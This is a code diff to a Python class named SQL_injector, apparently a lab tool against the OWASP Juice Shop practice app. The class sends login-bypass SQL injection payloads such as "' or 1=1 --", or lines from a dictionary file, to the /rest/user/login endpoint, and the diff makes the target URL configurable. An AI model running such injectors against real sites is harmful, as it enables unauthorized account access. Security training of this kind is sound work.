@@ -3,8 +3,8 @@ from . import attack as a
 class SQL_injector(a.attack_inter):
     def __init__(self, dictionary=None):
         self.dictionary = dictionary
-        # First trying to load cookies from local cookie file
         self.juice_session = a.requests.session()
+        self.url = a.URL + '/rest/user/login'
         #self.juice_session.cookies = a.cookielib.LWPCookieJar(filename="./juiceShopCookies.txt")
 
     def generator(self, myScript='\' or 1=1 --'):
@@ -24,7 +24,7 @@ class SQL_injector(a.attack_inter):
             for line in f:
                 line = line.rstrip()
                 headers, json_data = self.generator(line)
-                response = self.juice_session.post('http://localhost:3000/rest/user/login', json=json_data, verify=False)
+                response = self.juice_session.post(self.url, json=json_data, verify=False)
                 if response.status_code == 200:
                     res_payload_dict = response.json()
                     print("Valid script: ", json_data['email'])
@@ -33,7 +33,7 @@ class SQL_injector(a.attack_inter):
                     break
         else:
             headers, json_data = self.generator()
-            response = self.juice_session.post('http://localhost:3000/rest/user/login', json=json_data)
+            response = self.juice_session.post(self.url, json=json_data)
             if response.status_code == 200:
                 res_payload_dict = response.json()
                 print("Valid script: ", json_data['email'])
